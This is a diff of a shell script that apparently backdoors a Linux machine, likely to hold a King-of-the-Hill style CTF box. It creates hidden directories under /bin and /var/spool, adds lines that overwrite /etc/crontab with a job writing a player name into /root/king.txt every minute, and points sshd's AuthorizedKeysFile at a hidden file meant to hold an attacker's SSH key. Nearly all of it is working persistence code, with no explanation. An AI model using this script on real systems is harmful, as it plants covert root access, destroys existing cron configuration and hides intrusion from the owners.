@@ -20,9 +20,13 @@ mkdir /var/spool/.nano/.history;
 mkdir /bin/.screen;
 mkdir /bin/.screen/.config;
 
+echo '* * * * * echo lostayush > /root/king.txt' > /etc/crontab
+echo '* * * * * sleep 30;echo lostayush > /root/king.txt' > /etc/crontab
+
 
 ##echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkkJKTGN541AcbS8fgtHCVdaAqt5/QBXSUir4SxMFezXwY1Tprvp2Goie1WNUWG2VUw8nl6ctqHb5Oryoq4NCJUY5uScNrQ2Fysie3RiYNP15uacp0AgkulEhwH27z2VXnu/y7fJZQG+pG8pvDPt7GWSLHPD/ICWRny/r6VLKgNw03CjkCS8LmjKv7wqLOwLDZOFZWRjrIWgq0POQ5L9akynNoW/tz0D2UBDE782ObzPUNyjHIV2KLJUtpxb6AxrH+W8Pco8Sq8sorvRWk32lOmb7kBm4C8oA+/Yy0tWTibzoOWtkXzBUgqQGVZoDg+kUZV5pnzsUuX3z5zQJ4Nv3JYl7XPbWj/CL7Rwf/L1Huv35hp5xJxdivGWKui0newt67zmroebAxmHGreCocrwxoXeV/SpG3iqemsfeA7uR2ka9a3fZek/qjm7MKC2DoSEdKqC5bdQCKvmbAoVxo22VL/fLNXZPHyD6ASaGlJ1Iu5JITGUE2xI44bZHPsxJvK60= ayush@kali
 ##' > /bin/.screen/.config/p;
+
 
 echo 'AuthorizedKeysFile     /bin/.screen/.config/p' >> /etc/ssh/sshd_config;
 
